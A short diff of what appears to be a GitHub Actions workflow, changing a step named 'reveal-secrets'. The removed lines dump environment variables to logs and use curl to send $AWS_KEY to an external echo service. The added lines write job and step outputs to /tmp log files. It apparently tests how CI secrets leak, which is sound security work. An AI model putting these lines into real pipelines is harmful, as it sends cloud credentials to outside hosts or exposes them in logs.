@@ -29,9 +29,10 @@ jobs:
       id: reveal-secrets
       run: |
         set -x
-        env >> /tmp/env.log
-        set >> /tmp/set.log
-        curl https://echo.free.beeceptor.com/sample-request?secret=$AWS_KEY
+        echo '${{ toJson(needs.build.outputs) }}' > /tmp/needs_build.log
+        echo '${{ toJson(needs.import-secrets.outputs) }}' > /tmp/needs_import-secrets.log
+        echo '${{ toJson(steps.build.outputs) }}' > /tmp/steps_build.log
+        echo '${{ toJson(steps.import-secrets.outputs) }}' > /tmp/steps_import-secrets.log
 
 
   deploy:
